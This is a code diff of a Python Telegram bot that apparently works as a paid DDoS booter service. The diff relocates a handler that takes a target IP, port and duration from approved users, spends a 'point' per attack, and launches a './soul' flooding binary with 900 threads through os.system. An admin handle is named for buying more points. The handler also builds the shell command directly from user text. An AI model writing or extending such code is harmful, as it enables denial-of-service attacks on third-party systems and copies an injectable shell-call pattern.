@@ -32,6 +32,60 @@ def handle_start(message):
         user_points[user_id] = 5  # Default 5 points for new users
         bot.send_message(message.chat.id, f"🎉 You have been granted access! You have {user_points[user_id]} points. To start an attack, send IP, Port, and Duration.\n🙏 Example format: `167.67.25 6296 100`")
 
+# Handle attack command (IP, Port, Duration)
+@bot.message_handler(func=lambda message: user_permissions.get(message.from_user.id) == 'approved')
+def handle_attack_command(message):
+    global attack_in_progress
+    user_id = message.from_user.id
+    if attack_in_progress:
+        bot.send_message(message.chat.id, "⚠️ An attack is currently in progress. Please try again later.")
+        return
+
+    if user_points.get(user_id, 0) == 0:
+        bot.send_message(message.chat.id, "❗ You have no points left. Please contact the admin @samy784 to get more points.")
+        return
+
+    try:
+        parts = message.text.split()
+        if len(parts) != 3:
+            bot.send_message(message.chat.id, "❗ Please send the correct format: IP Port Duration\nExample: `167.67.25 6296 100`.")
+            return
+
+        target_ip, target_port, duration = parts
+        target_port = int(target_port)
+        duration = int(duration)
+        
+        # Set the default number of threads to 900
+        threads = 900
+
+        # Check for valid IP format
+        if not target_ip.replace('.', '').isdigit() or target_ip.count('.') != 3:
+            bot.send_message(message.chat.id, "❗ Invalid IP address format. Please provide a valid IP.")
+            return
+
+        if duration > 100:
+            bot.send_message(message.chat.id, "❗ The maximum attack duration is 100 seconds. Please provide a shorter duration.")
+            return
+
+        # Start the attack
+        attack_in_progress = True
+        bot.send_message(message.chat.id, f"🚀 Attack in process!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds with {threads} threads.")
+
+        # Execute the attack using the `./soul` command
+        attack_command = f"./soul {target_ip} {target_port} {duration} {threads}"
+        os.system(attack_command)
+
+        # Decrease points after attack completion
+        user_points[user_id] -= 1
+        attack_in_progress = False
+        bot.send_message(message.chat.id, f"🎉 Attack completed! You now have {user_points[user_id]} points remaining.\nFor more points, please contact the admin @samy784.")
+
+    except ValueError:
+        bot.send_message(message.chat.id, "❗ Port and Duration must be numeric values. Please provide valid inputs.")
+    except Exception as e:
+        bot.send_message(message.chat.id, "❗ Something went wrong. Please try again later.")
+        attack_in_progress = False
+
 # Admin adds points to a user
 @bot.message_handler(commands=['addpoint'])
 def add_points(message):
@@ -89,60 +143,6 @@ def check_all_points(message):
         points_report += f"👤 {user.first_name} (ID: {user_id}): {points} points\n"
 
     bot.send_message(message.chat.id, points_report)
-
-# Handle attack command (IP, Port, Duration)
-@bot.message_handler(func=lambda message: user_permissions.get(message.from_user.id) == 'approved')
-def handle_attack_command(message):
-    global attack_in_progress
-    user_id = message.from_user.id
-    if attack_in_progress:
-        bot.send_message(message.chat.id, "⚠️ An attack is currently in progress. Please try again later.")
-        return
-
-    if user_points.get(user_id, 0) == 0:
-        bot.send_message(message.chat.id, "❗ You have no points left. Please contact the admin @samy784 to get more points.")
-        return
-
-    try:
-        parts = message.text.split()
-        if len(parts) != 3:
-            bot.send_message(message.chat.id, "❗ Please send the correct format: IP Port Duration\nExample: `167.67.25 6296 100`.")
-            return
-
-        target_ip, target_port, duration = parts
-        target_port = int(target_port)
-        duration = int(duration)
-        
-        # Set the default number of threads to 900
-        threads = 900
-
-        # Check for valid IP format
-        if not target_ip.replace('.', '').isdigit() or target_ip.count('.') != 3:
-            bot.send_message(message.chat.id, "❗ Invalid IP address format. Please provide a valid IP.")
-            return
-
-        if duration > 100:
-            bot.send_message(message.chat.id, "❗ The maximum attack duration is 100 seconds. Please provide a shorter duration.")
-            return
-
-        # Start the attack
-        attack_in_progress = True
-        bot.send_message(message.chat.id, f"🚀 Attack in process!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds with {threads} threads.")
-
-        # Execute the attack using the `./soul` command (similar to second file)
-        attack_command = f"./soul {target_ip} {target_port} {duration} {threads}"
-        os.system(attack_command)
-
-        # Decrease points after attack completion
-        user_points[user_id] -= 1
-        attack_in_progress = False
-        bot.send_message(message.chat.id, f"🎉 Attack completed! You now have {user_points[user_id]} points remaining.\nFor more points, please contact the admin @samy784.")
-
-    except ValueError:
-        bot.send_message(message.chat.id, "❗ Port and Duration must be numeric values. Please provide valid inputs.")
-    except Exception as e:
-        bot.send_message(message.chat.id, "❗ Something went wrong. Please try again later.")
-        attack_in_progress = False
 
 # Automatic reminder every 10 minutes (Fixed with async/await)
 async def send_10_minute_reminder():
